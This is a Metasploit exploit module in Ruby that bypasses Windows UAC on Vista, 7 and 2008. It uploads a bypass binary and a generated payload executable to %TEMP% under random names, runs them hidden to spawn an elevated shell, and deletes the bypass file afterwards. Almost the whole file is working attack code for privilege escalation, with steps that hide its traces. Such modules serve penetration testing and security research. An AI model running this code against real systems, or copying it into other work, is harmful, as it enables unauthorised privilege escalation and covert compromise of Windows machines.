# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Post::Common
  include Exploit::EXE
  include Post::File

  def initialize(info={})
    super( update_info( info,
      &#039;Name&#039;          => &#039;Windows Escalate UAC Protection Bypass&#039;,
      &#039;Description&#039;   => %q{
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
          &#039;David Kennedy "ReL1K" <kennedyd013[at]gmail.com>&#039;,
          &#039;mitnick&#039;,
          &#039;mubix <mubix[at]hak5.org>&#039; # Port to local exploit
        ],
      &#039;Version&#039;       => &#039;$Revision$&#039;,
      &#039;Platform&#039;      => [ &#039;windows&#039; ],
      &#039;Targets&#039;       => [ [ &#039;Windows&#039;, {} ] ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039;    => [
        [ &#039;URL&#039;, &#039; http://www.trustedsec.com/december-2010/bypass-windows-uac/&#039; ]
      ],
      &#039;DisclosureDate&#039;=> "Dec 31, 2010"
    ))

  end

  def exploit


    #
    # Verify use against Vista+
    #
    vuln = false
    winver = sysinfo["OS"]
    affected = [ &#039;Windows Vista&#039;, &#039;Windows 7&#039;, &#039;Windows 2008&#039; ]
    affected.each { |v|
      if winver.include? v
        vuln = true
      end
    }
    if not vuln
      print_error("#{winver} is not vulnerable.")
      return
    end

    #
    # Generate payload and random names for upload
    #
    payload = generate_payload_exe

    # randomize the bypass_uac_filename
    bypass_uac_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    # randomize the payload exe name
    payload_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    # path to the bypassuac binary
    path = ::File.join(Msf::Config.install_root, "data", "post")

    # decide, x86 or x64
    bpexe = nil
    if sysinfo["Architecture"] =~ /wow64/i
      bpexe = ::File.join(path, "bypassuac-x64.exe")
    else
      bpexe = ::File.join(path, "bypassuac-x86.exe")
    end

    tmpdir = session.fs.file.expand_path("%TEMP%")
    cmd = "#{tmpdir}\\#{bypass_uac_filename} /c %TEMP%\\#{payload_filename}"

    print_status("Uploading the bypass UAC executable to the filesystem...")

    begin
      #
      # Upload UAC bypass to the filesystem
      #
      session.fs.file.upload_file("%TEMP%\\#{bypass_uac_filename}", bpexe)
      #
      # Upload the payload to the filesystem
      #
      tempexe = tmpdir + "\\" + payload_filename
      fd = client.fs.file.new(tempexe, "wb")
      fd.write(payload)
      fd.close
    rescue ::Exception => e
      print_error("Error uploading file #{bypass_uac_filename}: #{e.class} #{e}")
      return
    end

    print_status("Uploaded the agent to the filesystem....")

    # execute the payload
    session.sys.process.execute(cmd, nil, {&#039;Hidden&#039; => true})

    # delete the uac bypass payload
    delete_file = "cmd.exe /c del #{tmpdir}\\#{bypass_uac_filename}"

    session.sys.process.execute(delete_file, nil, {&#039;Hidden&#039; => true})
  end
end



